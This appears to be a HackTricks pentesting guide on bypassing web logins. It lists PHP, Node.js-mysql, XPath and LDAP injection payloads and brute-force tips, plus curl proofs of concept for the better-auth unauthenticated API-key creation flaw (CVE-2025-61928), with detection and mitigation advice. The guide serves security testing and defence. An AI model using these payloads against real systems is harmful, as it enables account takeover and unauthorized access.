# Login Bypass

{{#include ../../banners/hacktricks-training.md}}

## **Bypass regular login**

If you find a login page, here you can find some techniques to try to bypass it:

- Check for **comments** inside the page (scroll down and to the right?)
- Check if you can **directly access the restricted pages**
- Check to **not send the parameters** (do not send any or only 1)
- Check the **PHP comparisons error:** `user[]=a&pwd=b` , `user=a&pwd[]=b` , `user[]=a&pwd[]=b`
- **Change content type to json** and send json values (bool true included)
  - If you get a response saying that POST is not supported you can try to send the **JSON in the body but with a GET request** with `Content-Type: application/json`
- Check nodejs potential parsing error (read [**this**](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)): `password[password]=1`
  - Nodejs will transform that payload to a query similar to the following one: ` SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` `` `**`password=password=1`**`;` which makes the password bit to be always true.
  - If you can send a JSON object you can send `"password":{"password": 1}` to bypass the login.
  - Remember that to bypass this login you still need to **know and send a valid username**.
  - **Adding `"stringifyObjects":true`** option when calling `mysql.createConnection` will eventually b**lock all unexpected behaviours when `Object` is passed** in the parameter.
- Check credentials:
  - [**Default credentials**](../../generic-hacking/brute-force.md#default-credentials) of the technology/platform used
  - **Common combinations** (root, admin, password, name of the tech, default user with one of these passwords).
  - Create a dictionary using **Cewl**, **add** the **default** username and password (if there is) and try to brute-force it using all the words as **usernames and password**
  - **Brute-force** using a bigger **dictionary (**[**Brute force**](../../generic-hacking/brute-force.md#http-post-form)**)**

### SQL Injection authentication bypass

[Here you can find several tricks to bypass the login via **SQL injections**](../sql-injection/index.html#authentication-bypass).

In the following page you can find a **custom list to try to bypass login** via SQL Injections:


{{#ref}}
sql-login-bypass.md
{{#endref}}

### No SQL Injection authentication bypass

[Here you can find several tricks to bypass the login via **No SQL Injections**](../nosql-injection.md#basic-authentication-bypass)**.**

As the NoSQL Injections requires to change the parameters value, you will need to test them manually.

### XPath Injection authentication bypass

[Here you can find several tricks to bypass the login via **XPath Injection.**](../xpath-injection.md#authentication-bypass)

```
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
```

### LDAP Injection authentication bypass

[Here you can find several tricks to bypass the login via **LDAP Injection.**](../ldap-injection.md#login-bypass)

```
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
```

### Remember Me

If the page has "**Remember Me**" functionality check how is it implemented and see if you can abuse it to **takeover other accounts**.

### Redirects

Pages usually redirects users after login, check if you can alter that redirect to cause an [**Open Redirect**](../open-redirect.md). Maybe you can steal some information (codes, cookies...) if you redirect the user to your web.

## Other Checks

- Check if you can **enumerate usernames** abusing the login functionality.
- Check if **auto-complete** is active in the password/**sensitive** information **forms** **input:** `<input autocomplete="false"`

## Automatic Tools

- [HTLogin](https://github.com/akinerkisa/HTLogin)



## Body-controlled identity (userId in body) → Pre-auth account/key takeover

A common auth logic flaw in JSON APIs is to derive the authenticated subject from a client-controlled identifier in the request body (e.g., userId), effectively disabling auth when that field is present. Example pattern seen in the wild:

```ts
const authRequired = (ctx.request || ctx.headers) && !ctx.body.userId;
const user = session?.user ?? (authRequired ? null : { id: ctx.body.userId });
```

Why it’s broken
- In normal requests `(ctx.request || ctx.headers)` is truthy, so providing `userId` makes `authRequired === false`.
- If there is no valid session, the handler fabricates `user = { id: ctx.body.userId }` from attacker input and proceeds as if authenticated.
- Server-only validation/authorization branches are skipped, letting clients set privileged fields.

Real-world impact (better-auth API keys plugin)
- Affected routes: `/api/auth/api-key/create` and `/api/auth/api-key/update` accepted an attacker-supplied `userId` and skipped auth.
- Attacker could mint or modify API keys for arbitrary users, and set privileged fields like `permissions`, `rateLimitMax`, `refillAmount`, `remaining`.

Minimal PoC (no session/cookies required)
```bash
curl -X POST http://localhost:3000/api/auth/api-key/create \
  -H 'Content-Type: application/json' \
  -d '{
    "userId": "victim-user-id",
    "name": "test"
  }'
```

Privilege-shaped PoC
```bash
curl -X POST http://localhost:3000/api/auth/api-key/create \
  -H 'Content-Type: application/json' \
  -d '{
    "userId": "victim-user-id",
    "name": "ops-key",
    "permissions": ["*"],
    "rateLimitMax": 1000000,
    "refillAmount": 1000000,
    "remaining": null
  }'
```

Hunting tips
- Grep for handlers that build identity from request JSON: `body.userId`, `body.accountId`, `body.username` used to set `req.user`, `ctx.user`, etc.
- Look for ternaries/branches where the existence of a body field disables auth, e.g., `authRequired = ... && !body.userId`.
- Review create/update endpoints for “server-only” fields accepted in unauthenticated paths (permissions, roles, rate limits, quotas, ownership fields).

Detection/forensics
- Search logs and reverse-proxy telemetry for unauthenticated POSTs to key-management endpoints where bodies contain `userId` and privileged fields.
- Flag responses that include credentials (e.g., returned `key`) without an accompanying valid session cookie/token.
- Correlate suspicious key creations/updates with subsequent API usage from unfamiliar IPs/agents.

Mitigations
- Never derive identity from client-controlled body fields. Treat `userId` as server-only.
- Require an authenticated server-side session/credential for any key or account management.
- Centralize authorization checks (RBAC/ABAC) and reject privileged fields from unauthenticated contexts.
- If using better-auth, upgrade to >= 1.3.26 and rotate/review keys created during the exposure window.

## References

- [Critical Account Takeover via Unauthenticated API Key Creation in better-auth (CVE-2025-61928)](https://zeropath.com/blog/breaking-authentication-unauthenticated-api-key-creation-in-better-auth-cve-2025-61928)
- [better-auth NPM Package](https://www.npmjs.com/package/better-auth)
- [GHSA-99h5-pjcv-gr6v advisory](https://github.com/better-auth/better-auth/security/advisories/GHSA-99h5-pjcv-gr6v)
- [API keys plugin introduction PR #1515](https://github.com/better-auth/better-auth/pull/1515)

{{#include ../../banners/hacktricks-training.md}}